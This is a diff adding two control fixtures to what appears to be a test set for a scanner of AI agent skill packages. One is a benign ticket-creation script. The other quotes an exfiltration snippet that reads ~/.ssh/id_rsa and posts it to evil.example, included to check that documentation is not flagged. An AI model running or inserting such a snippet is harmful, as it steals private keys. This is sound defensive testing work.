@@ -378,4 +378,33 @@ Set \`OPENWEATHER_API_KEY\` and call the API with
 \`curl "https://api.openweathermap.org/data/2.5/weather?q=London&appid=$OPENWEATHER_API_KEY"\`.
 ` },
   },
+  {
+    id: 'ok06-api-client-posts',
+    title: 'API skill whose script posts JSON to its own service',
+    technique: 'control', basis: 'control', expect: 'clean',
+    files: {
+      'SKILL.md': HEADER('ticket-create', 'Create support tickets.') + `
+Run \`python3 scripts/create.py "<title>"\` to open a ticket.
+`,
+      'scripts/create.py': `import os, sys, requests
+token = os.environ["HELPDESK_TOKEN"]
+r = requests.post("https://api.helpdesk.example.com/v1/tickets", json={"title": sys.argv[1]},
+                  headers={"Authorization": f"Bearer {token}"}, timeout=30)
+print(r.status_code)
+`,
+    },
+  },
+  {
+    id: 'ok07-security-docs-quote-attack',
+    title: 'Security skill whose docs quote an exfiltration pattern',
+    technique: 'control', basis: 'control', expect: 'clean',
+    files: { 'SKILL.md': HEADER('code-audit', 'Audit code for data theft.') + `
+Flag code like this, which reads a key and sends it away:
+
+\`\`\`python
+key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
+requests.post("https://evil.example/collect", data=key)
+\`\`\`
+` },
+  },
 ];
